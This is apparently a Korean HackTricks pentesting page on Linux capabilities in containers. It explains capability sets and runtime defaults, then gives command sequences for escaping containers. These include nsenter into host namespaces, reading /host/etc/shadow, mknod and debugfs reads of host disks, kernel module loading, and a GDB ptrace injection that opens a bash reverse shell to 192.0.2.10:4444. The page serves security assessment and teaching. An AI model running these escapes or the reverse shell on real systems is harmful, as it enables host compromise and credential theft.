# 컨테이너의 Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux capabilities는 컨테이너 보안에서 가장 중요한 요소 중 하나입니다. 미묘하지만 근본적인 질문, 즉 **컨테이너 안에서 "root"란 실제로 무엇을 의미하는가?**에 답을 주기 때문입니다. 일반적인 Linux 시스템에서 UID 0은 역사적으로 매우 광범위한 권한을 의미했습니다. 최신 커널에서는 이 권한이 capabilities라는 더 작은 단위로 나뉩니다. 관련 capability가 제거되면 프로세스는 root로 실행 중이더라도 여러 강력한 작업을 수행할 수 없습니다. <sup>[[1]](#references)</sup>

컨테이너는 이러한 차이에 크게 의존합니다. 호환성이나 단순성 때문에 여전히 많은 워크로드가 컨테이너 안에서 UID 0으로 실행됩니다. capabilities를 제거하지 않는다면 이는 지나치게 위험합니다. capabilities를 제거하면 컨테이너의 root 프로세스는 일반적인 컨테이너 내부 작업을 수행하면서도 더 민감한 커널 작업은 거부될 수 있습니다. 따라서 컨테이너 셸에 `uid=0(root)`라고 표시되어도 "host root"를 의미하는 것은 물론, 광범위한 커널 권한을 뜻하는 것도 아닙니다. capability 집합에 따라 해당 root ID가 실제로 갖는 권한이 결정됩니다.

전체 Linux capability 레퍼런스와 다양한 악용 사례는 다음을 참조하세요.

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 작동 방식

capabilities는 permitted, effective, inheritable, ambient, bounding 집합을 포함한 여러 집합으로 관리됩니다. 많은 컨테이너 평가에서 각 집합의 정확한 커널 동작보다 당장 실질적으로 중요한 질문은 다음과 같습니다. **이 프로세스가 지금 성공적으로 수행할 수 있는 권한 작업은 무엇이며, 앞으로 어떤 권한을 추가로 얻을 수 있는가?** <sup>[[1]](#references)</sup>

이 점이 중요한 이유는 많은 breakout 기법이 실제로는 컨테이너 문제로 위장한 capability 문제이기 때문입니다. `CAP_SYS_ADMIN`이 있는 워크로드는 일반적인 컨테이너 root 프로세스가 접근하지 않아야 할 방대한 커널 기능에 접근할 수 있습니다. `CAP_NET_ADMIN`이 있는 워크로드는 host network namespace도 공유한다면 훨씬 더 위험해집니다. `CAP_SYS_PTRACE`가 있는 워크로드는 host PID 공유를 통해 host 프로세스를 볼 수 있다면 더 큰 주의가 필요합니다. Docker나 Podman에서는 `--pid=host`로 나타날 수 있으며, Kubernetes에서는 보통 `hostPID: true`로 설정됩니다.

즉, capability 집합만 따로 평가해서는 안 됩니다. namespaces, seccomp, MAC policy와 함께 살펴봐야 합니다.

## 실습

컨테이너 내부에서 capabilities를 확인하는 가장 직접적인 방법은 다음과 같습니다.

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

모든 capabilities가 추가된 컨테이너와 더 제한적인 컨테이너를 비교할 수도 있습니다:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

좁은 범위로 capability를 추가했을 때의 효과를 확인하려면 모든 capability를 제거한 다음 하나만 다시 추가해 보세요:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

이러한 간단한 실험을 통해 runtime이 단순히 "privileged"라는 boolean을 켜고 끄는 것이 아님을 알 수 있습니다. runtime은 프로세스가 사용할 수 있는 실제 권한 범위를 구성합니다.

## High-Risk Capabilities

Capability는 작업 대상이 **host가 관리하는 리소스**에 도달할 때만 escape primitive가 됩니다. 반복해서 나타나는 고위험 조합은 다음과 같습니다.

- **`CAP_SYS_ADMIN`**과 host PID, block device 또는 쓰기 가능한 kernel-control 경로. 대상 mount namespace에 참여하려면 `CAP_SYS_CHROOT`도 필요합니다. block 기반 filesystem을 mount하려면 initial user namespace에서 `CAP_SYS_ADMIN`이 필요합니다.
- **`CAP_SYS_PTRACE`**와 host PID 가시성, 그리고 attach할 수 있는 host 프로세스. ptrace injection에는 `CAP_SYS_ADMIN`이 필요하지 않습니다.
- **`CAP_DAC_OVERRIDE` 또는 `CAP_DAC_READ_SEARCH`**와 접근 가능한 host filesystem. 이 capability들은 서로 다른 DAC 검사를 우회하지만 host filesystem view를 생성하지는 않습니다.
- Initial user namespace의 **`CAP_SYS_MODULE`**과 허용되는 kernel 호환 모듈. 일반적인 Linux container는 node의 kernel을 공유하지만, VM 또는 userspace-kernel runtime은 이 경계를 바꿉니다.
- Initial user namespace의 **`CAP_MKNOD`**와 device cgroup에서 이미 허용된 실제 host device. node를 생성해도 device cgroup을 우회할 수는 없습니다.
- **`CAP_SYS_RAWIO`**와 노출되어 사용 가능한 memory, I/O port, PCI 또는 device-control interface.
- Host를 reboot하려면 initial PID namespace의 **`CAP_SYS_BOOT`**이 필요합니다. kernel을 교체하려면 사용 가능하고 허용된 kexec 경로가 필요합니다.
- Host network namespace의 **`CAP_NET_ADMIN`**은 node의 네트워크 상태를 직접 제어할 수 있습니다. **`CAP_NET_RAW`**는 특정 protocol을 이용한 escape에 쓰일 수 있지만, raw socket만으로 node shell을 얻을 수는 없습니다.

`CAP_SYS_CHROOT`는 단독으로 escape를 일으키는 capability 목록에 의도적으로 포함하지 않았습니다. mount namespace `setns()`에 필요할 수 있고 이미 접근 가능한 host tree를 더 쉽게 사용할 수 있게 할 수 있지만, `chroot()`만으로는 해당 tree에 접근할 수 없으며 새로운 filesystem 권한도 부여되지 않습니다. 마찬가지로 **`CAP_BPF`**와 **`CAP_PERFMON`**은 강력한 telemetry와 kernel 공격 표면을 제공하지만, 별도의 kernel 취약점이 없다면 일반적인 작업만으로는 범용적인 container escape를 일으키지 않습니다.

## Runtime Usage

Docker, Podman, containerd 기반 stack, CRI-O는 모두 capability 제어를 사용하지만 기본값과 관리 interface는 다릅니다. Docker에서는 `--cap-drop`, `--cap-add` 같은 flag로 직접 설정할 수 있습니다. Podman도 비슷한 제어 기능을 제공하며, 추가적인 안전 계층으로 rootless 실행을 함께 사용하는 경우가 많습니다. Kubernetes에서는 Pod 또는 container `securityContext`를 통해 capability 추가 및 제거를 설정하고, 하위 수준 runtime은 결과 집합을 OCI runtime configuration에 지정합니다. LXC, Incus와 같은 system-container 환경도 capability 제어를 사용하지만, host와의 통합 범위가 넓어 운영자가 애플리케이션 container에서보다 더 쉽게 기본 설정을 완화할 수 있습니다. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

이 원칙은 모든 환경에 동일하게 적용됩니다. 기술적으로 부여할 수 있는 capability라고 해서 반드시 부여해야 하는 것은 아닙니다. 실제 사고 중 상당수는 workload가 더 엄격한 설정에서 실패하자 팀이 빠른 해결책을 찾으려 capability를 추가하는 데서 시작됩니다.

## Misconfigurations

가장 명백한 실수는 Docker/Podman 스타일 CLI에서 **`--cap-add=ALL`**을 사용하는 것이지만, 이것만 문제가 되는 것은 아닙니다. 실제로는 namespace, seccomp, mount에 미치는 영향을 파악하지 않은 채 "애플리케이션이 작동하게" 하려고 `CAP_SYS_ADMIN`과 같은 매우 강력한 capability 한두 개를 부여하는 경우가 더 흔합니다. 추가 capability와 host namespace 공유를 함께 설정하는 것도 흔한 문제입니다. Docker 또는 Podman에서는 `--pid=host`, `--network=host`, `--userns=host`로 나타날 수 있고, Kubernetes에서는 보통 `hostPID: true`, `hostNetwork: true`와 같은 workload 설정으로 나타납니다. 이러한 조합은 각각 capability가 실제로 영향을 미칠 수 있는 대상을 바꿉니다.

또한 workload가 완전히 `--privileged`가 아니므로 여전히 의미 있는 제한을 받고 있다고 관리자가 생각하는 경우도 흔합니다. 때로는 맞는 말이지만, 때로는 실제 보안 상태가 이미 privileged에 충분히 가까워서 운영상 차이가 더는 중요하지 않습니다.

## Abuse

먼저 유효 capability 집합, user namespace 매핑, seccomp 상태, namespace, mount, device를 기록합니다. 이러한 맥락 없이 capability 이름만으로는 escape가 가능하다고 단정할 수 없습니다:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: 네임스페이스 및 블록 디바이스

호스트 PID를 볼 수 있는 상태에서는 `CAP_SYS_ADMIN`으로 호스트 네임스페이스에 진입할 수 있습니다. mount 네임스페이스 작업에는 호출자의 user namespace에서 `CAP_SYS_CHROOT`도 필요합니다.

**capability와 격리 상태 확인:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**대상을 열거하세요:** container/Pod 구성이나 명백한 host 프로세스 목록을 통해 host PID 공유를 확인한 다음, 대상 namespaces를 살펴보세요. private PID namespaces에도 로컬 PID 1이 있으므로, 이것이 존재한다는 사실만으로 host PID 공유가 입증되지는 않습니다.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**네임스페이스 경로 악용:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

대상 파일 시스템을 소유한 user namespace에서 capability 검사가 성공해야 합니다. `--pid=host` 또는 Kubernetes의 `hostPID: true`는 가시성을 제공할 뿐, capability를 제공하지는 않습니다.

대체 block-device 경로에서는 후보를 **enumerate**한 다음, 검증된 후보를 먼저 read-only로 마운트하여 접근 가능한 파일 시스템을 **exploit**합니다:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

디바이스 노드가 존재해야 하고, 디바이스 cgroup에서 해당 디바이스를 허용해야 합니다. 또한 블록 파일시스템을 마운트하려면 초기 user namespace에서 `CAP_SYS_ADMIN`이 필요합니다. 이미 `/host`에 bind mount된 host root는 `CAP_SYS_ADMIN` 없이도 host에 접근할 수 있습니다. `chroot /host`는 편의를 위한 방법일 뿐이며, 별도로 `CAP_SYS_CHROOT`가 필요합니다.

### 접근 가능한 host root: 직접 파일시스템 실행

host root가 이미 `/host`에 마운트되어 있다면, 먼저 마운트를 확인한 다음 기존 접근 권한을 직접 사용하세요. 이 방법은 `CAP_SYS_ADMIN`에 의존하지 않습니다:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

`chroot()`를 사용할 수 없더라도 호스트 바이너리가 컨테이너의 아키텍처 및 로더와 호환된다면, 마운트된 트리를 통해 호출할 수 있는 경우가 많습니다:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

`/host`에서 직접 읽고 쓰는 것은 이미 호스트 파일 시스템 침해입니다. `chroot()`를 사용하거나 호스트 바이너리를 실행하면 해당 접근이 더 편리해질 뿐입니다. 어느 작업도 호스트 마운트를 생성하거나 읽기 전용 마운트 또는 MAC 정책을 우회하지는 않습니다.

### `CAP_SYS_PTRACE`: 호스트 프로세스 인젝션

호스트 PID를 볼 수 있고 대상의 사용자 네임스페이스에서 `CAP_SYS_PTRACE`가 있으면, GDB를 사용해 승인된 호스트 프로세스에서 `system()`을 호출할 수 있습니다. `CAP_SYS_ADMIN`은 필요하지 않습니다.

**capability 및 attach 제어 확인:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**폐기 가능한 대상을 열거하고 선택:** 설정 또는 명확히 식별 가능한 node 프로세스 목록을 통해 호스트 PID 공유 여부를 확인하세요. PID 1이나 중요한 데몬은 절대 선택하지 마세요.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**선택한 프로세스 악용:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

대상 프로세스에 attach할 수 있어야 하며, 사용 가능한 `system()` 심볼과 Bash payload 경로가 있어야 합니다. Yama, non-dumpable 상태, seccomp, user namespaces, MAC policy가 이 체인을 차단할 수 있습니다. GDB는 attach된 동안 대상 프로세스를 중지하므로, 폐기 가능한 lab 프로세스만 사용하세요.

### `CAP_DAC_OVERRIDE` 및 `CAP_DAC_READ_SEARCH`: 보호된 호스트 파일

이러한 capabilities는 호스트 filesystem을 노출하지 않습니다. `/host`가 이미 호스트 mount라면, `CAP_DAC_READ_SEARCH`는 read/search DAC 검사를 우회할 수 있고 `CAP_DAC_OVERRIDE`는 일반적인 write 검사도 우회할 수 있습니다.

**capabilities 확인:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**노출된 호스트 파일 시스템을 열거하고 대상 권한을 확인합니다:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**폐기 가능한 lab에서 읽기 및 쓰기 우회 기법을 실습하세요**:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

읽기 전용 마운트와 LSM 규칙은 여전히 적용됩니다. `CAP_DAC_READ_SEARCH`는 `open_by_handle_at()`도 허용하지만, Shocker와 같은 탈출에는 동일한 기반 파일 시스템의 마운트 파일 디스크립터, 유효하거나 검색 가능한 핸들, 호환되는 파일 시스템/스토리지 레이아웃이 필요하며, 런타임이나 LSM의 차단이 없어야 합니다. 이 권한이 마운트 네임스페이스 외부의 모든 파일 시스템에 대한 임의 접근을 제공하는 것은 아닙니다.

### `CAP_SYS_MODULE`: 공유 커널에서의 실행

일반적인 Linux 컨테이너에서 허용된 모듈은 공유 호스트 커널에서 실행됩니다.

**권한과 사용자 네임스페이스 범위를 확인합니다:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**모듈 로딩 전제 조건 열거:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**폐기 가능한 노드에서 호환되는 사전 검토 proof module로만 Exploit하세요:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability은 initial user namespace에서 유효해야 합니다. 커널 버전 및 설정, 모듈 서명, lockdown, seccomp, LSM 정책이 모듈 로드를 허용해야 합니다. Kata, gVisor, Hyper-V isolation 및 유사한 런타임은 워크로드가 도달하는 커널 경계를 변경합니다.

### `CAP_MKNOD`: 허용된 디바이스 핸들 생성

`CAP_MKNOD`는 디바이스 노드를 생성하지만 device cgroup을 우회하지는 않습니다. 디바이스 생성은 namespaced되지 않으므로, capability은 initial user namespace에서 유효해야 합니다.

**Capability와 user-namespace 범위 확인:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**실제 장치, 해당 major/minor 번호 및 확인 가능한 cgroup-v1 허용 목록을 열거합니다:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**검증된 ext-family 후보를 읽기 전용으로 exploit하기:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

다른 파일시스템에는 이에 맞는 읽기 전용 도구가 필요하며, 장치를 마운트하려면 `CAP_SYS_ADMIN`도 필요합니다. 생성한 노드를 열 때 `Operation not permitted`가 표시되면 대개 device cgroup이 여전히 접근을 차단하고 있다는 뜻입니다. cgroup v2에서는 장치 접근을 보통 BPF로 적용하며 `devices.list` 파일이 없으므로, 열기에 성공하는지가 결정적인 테스트입니다.

### `CAP_SYS_RAWIO`: 노출된 raw-I/O 인터페이스

범용으로 사용할 수 있는 payload는 없습니다. 유효한 주소와 동작은 하드웨어 및 커널 구성에 따라 달라집니다.

**capability와 user namespace 범위를 확인합니다:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**노출된 원시 인터페이스, 하드웨어 및 드라이버 열거:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**식별된 장치와 주소 범위에 대해 승인된 proof만 사용해 exploit하세요.** `/dev/mem`이 실습에서 승인된 인터페이스라면, 이 템플릿은 내용을 출력하지 않고 노드 메모리 노출을 입증합니다:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

주소는 실험실의 하드웨어 맵에서 가져와야 합니다. 일부 MMIO 영역을 읽으면 부작용이 발생할 수 있기 때문입니다. 일반적인 메모리 쓰기 명령을 제시하는 것은 오해를 불러일으키고 위험합니다. 같은 주소라도 한 시스템에서는 무해하지만 다른 시스템에서는 하드웨어나 커널 메모리를 제어할 수 있습니다. Device cgroups, 파일시스템 권한, 엄격한 `/dev/mem` 정책, 커널 lockdown, 가상화, LSM 정책으로 인해 유용한 접근이 차단되는 경우가 많습니다.

### `CAP_SYS_BOOT`: namespace 재부팅 또는 커널 교체

비공개 PID namespace에서 `reboot()`는 호스트를 재부팅하는 대신 해당 namespace의 init 프로세스를 종료합니다. 따라서 호스트 재부팅에 영향을 주려면 일반적으로 호스트 PID 공유를 통해 초기 PID namespace에 접근해야 합니다. kexec 경로를 사용하려면 호환되는 커널 이미지와 허용적인 lockdown/서명 정책도 필요합니다.

**capability 확인:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**PID-namespace 및 kexec 전제 조건을 열거하세요:** PID namespace 링크만으로는 해당 namespace가 노드의 초기 namespace인지 알 수 없으므로, workload configuration에서 host PID 공유 여부를 확인하세요.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**일회용 랩 노드의 재부팅이 명시적인 실습 과제인 경우에만 Exploit하세요:**

```bash
sync
reboot -f
```

공유 노드에서 capability를 입증하려고 해당 명령을 실행하거나 커널을 로드하지 마세요. 비공개 PID namespace에서는 해당 namespace의 init 프로세스만 종료하며, 호스트에 미치는 영향을 입증하지 않습니다.

### `CAP_NET_ADMIN` 및 `CAP_NET_RAW`: 호스트 네트워크 경로

`CAP_NET_ADMIN`은 현재 network namespace에만 영향을 미칩니다.

**capability 및 격리 상태 확인:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**현재 네트워크를 열거하고 워크로드 구성에서 host networking을 확인합니다:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**`CAP_NET_ADMIN`을 되돌릴 수 있게 실습:** 호스트 네트워킹을 사용하면 임시 인터페이스는 노드 인터페이스입니다.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW`는 RAW 및 PACKET 소켓을 허용하지만 일반적인 호스트 셸을 제공하지는 않습니다. 문서화된 GCE 체인을 **열거**하려면 메타데이터 경로를 확인하고 평문 게스트 에이전트 트래픽을 관찰할 수 있는지 캡처하세요:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

일치하는 전제 조건이 있다면 [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html)에 문서화된 환경별 체인을 **exploit**하세요. 요청과 시퀀스 상태를 캡처하고, SSH 키가 포함된 위조된 메타데이터 응답을 삽입한 다음, 호스트 액세스를 검증합니다. 이 체인에는 root, 호스트 네트워킹, `CAP_NET_ADMIN`, `CAP_NET_RAW`, 암호화되지 않은 GCE 메타데이터 트래픽, 그리고 경쟁 조건을 악용할 수 있는 게스트 에이전트 요청이 필요합니다. 최신 전송 방식이나 에이전트 동작은 이 체인의 작동을 방해할 수 있습니다.

### 로컬 출처 제한 및 인터페이스 주소

리스너가 출발지가 `127.0.0.1`인 연결은 거부하면서도 동일한 네트워크 네임스페이스에 할당된 다른 주소는 간과할 수 있습니다. 해당 인터페이스에서 리스너에 연결할 수 있다면, 루프백 연결과 이미 할당된 비루프백 로컬 주소에 바인딩된 연결을 비교하세요. `CAP_NET_ADMIN`은 현재 네임스페이스에서 인터페이스를 설정할 수 있게 해줄 수 있지만, 적절한 주소가 이미 할당되어 있다면 필요하지 않습니다. 일반 TCP 연결에는 `CAP_NET_RAW`가 필요하지 않습니다. 이는 출발지 주소 분류의 실패이지, 컨테이너 탈출이나 애플리케이션이 권한 있는 요청을 승인한다는 증거가 아닙니다.<sup>[[1]](#references)[[7]](#references)</sup>

WebSocket 리스너에서 유효한 HTTP `101 Switching Protocols` 응답은 초기 핸드셰이크가 완료되었음을 나타냅니다. 이후 애플리케이션 수준 오류가 발생하면 연결이 핸들러에 도달했음을 보여줄 수 있습니다. 어느 응답도 인증에 성공했거나 요청한 작업이 수행되었음을 증명하지는 않습니다.<sup>[[8]](#references)</sup>

## 점검

capability 점검의 목적은 원시 값을 덤프하는 데 그치지 않고, 프로세스가 현재 네임스페이스 및 마운트 환경을 위험하게 만들 만큼 충분한 권한을 보유했는지 파악하는 것입니다.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

여기서 흥미로운 점은 다음과 같습니다.

- `capsh --print`는 `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, `cap_sys_module`과 같은 고위험 capability를 확인하는 가장 쉬운 방법입니다.
- `/proc/self/status`의 `CapEff` 행은 다른 집합에서 사용 가능할 수도 있는 capability가 아니라, 현재 실제로 유효한 capability를 보여줍니다.
- 컨테이너가 호스트 PID, 네트워크 또는 사용자 네임스페이스를 공유하거나 쓰기 가능한 호스트 마운트를 가진 경우, capability 덤프는 훨씬 더 중요해집니다.

원시 capability 정보를 수집한 다음 단계는 이를 해석하는 것입니다. 프로세스가 root인지, 사용자 네임스페이스가 활성화되어 있는지, 호스트 네임스페이스를 공유하는지, seccomp가 적용 중인지, AppArmor 또는 SELinux가 여전히 프로세스를 제한하는지 확인하세요. capability 집합만으로 전체 상황을 알 수는 없지만, 겉보기에는 같은 출발점에서 한 컨테이너 탈출은 성공하고 다른 탈출은 실패하는 이유를 설명해 주는 경우가 많습니다.

## 런타임 기본값

| 런타임 / 플랫폼 | 기본 상태 | 기본 동작 | 일반적인 수동 완화 |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 축소된 capability 집합 | Docker는 기본 허용 목록의 capability만 유지하고 나머지는 제거합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | 기본적으로 축소된 capability 집합 | Podman 컨테이너는 기본적으로 권한이 제한되며 축소된 capability 모델을 사용합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 변경하지 않으면 런타임 기본값을 상속 | `securityContext.capabilities`를 지정하지 않으면 컨테이너는 런타임의 기본 capability 집합을 받습니다 | `securityContext.capabilities.add`, `drop: [\"ALL\"]`을 설정하지 않음, `privileged: true` |
| Kubernetes에서 사용하는 containerd / CRI-O | 일반적으로 런타임 기본값 | 유효한 집합은 런타임과 Pod 사양에 따라 달라집니다 | Kubernetes 행과 동일하며, 직접 OCI/CRI 설정으로 capability를 명시적으로 추가할 수도 있습니다 |

Kubernetes에서 중요한 점은 API가 하나의 보편적인 기본 capability 집합을 정의하지 않는다는 것입니다. Pod에서 capability를 추가하거나 제거하지 않으면 워크로드는 해당 노드의 런타임 기본값을 상속합니다.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux 컨테이너 설정](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker 문서 - 런타임 권한 및 Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes 문서 - 컨테이너의 capability 설정](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman 문서 - `--cap-add` 및 `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus 문서 - 보안](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux IPv4 프로토콜 구현](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - WebSocket 프로토콜](https://www.rfc-editor.org/rfc/rfc6455.html)
